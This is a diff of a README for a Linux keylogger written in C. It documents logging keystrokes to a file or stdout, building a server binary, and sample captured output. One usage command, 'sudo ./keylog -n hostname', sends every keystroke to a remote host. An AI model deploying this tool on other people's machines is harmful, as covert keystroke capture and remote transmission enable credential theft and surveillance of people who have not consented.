@@ -4,13 +4,15 @@ A simple keylogger for Linux written in C. The current version will attempt to d
 
 ## Usage
 
+By default, keylog sends it's output to stdout. This allows us to do a bunch of things with the output of the keylogger. Examples will be stored in the [scripts](scripts) directory of the project. 
+
 ### Client
 
 #### File
 
 ```bash
 cd keylog/
-sudo ./keylog -f file-to-write-to.txt
+sudo ./keylog -o file-to-write-to.txt
 ```
 
 This will log all keystrokes to the specified file while the program is running.
@@ -25,7 +27,11 @@ sudo ./keylog -n hostname
 This will send all keystrokes to the server running on `hostname`.
 
 ### Server
-
+Compiling the project with
+``` bash
+make server
+```
+will give a seperate binary that will sit on a server machine and listen on a port and write to a file.  
 
 #### stdout
 
@@ -70,6 +76,44 @@ LEFTCTRL
 C
 ```
 
+Some captured output does not make sense without accounting for when a key was released. The following is the result passing `keylog` the `--released` flag and typing `Hello World!`.
+
+```
+ENTERreleased
+LEFTSHIFT
+H
+LEFTSHIFTreleased
+Hreleased
+E
+Ereleased
+L
+Lreleased
+L
+Lreleased
+O
+Oreleased
+SPACE
+SPACEreleased
+LEFTSHIFT
+W
+Wreleased
+LEFTSHIFTreleased
+O
+Oreleased
+R
+Rreleased
+L
+Lreleased
+D
+Dreleased
+LEFTSHIFT
+1
+1released
+LEFTSHIFTreleased
+LEFTCTRL
+C
+Creleased
+```
 ## Building
 
 ```bash
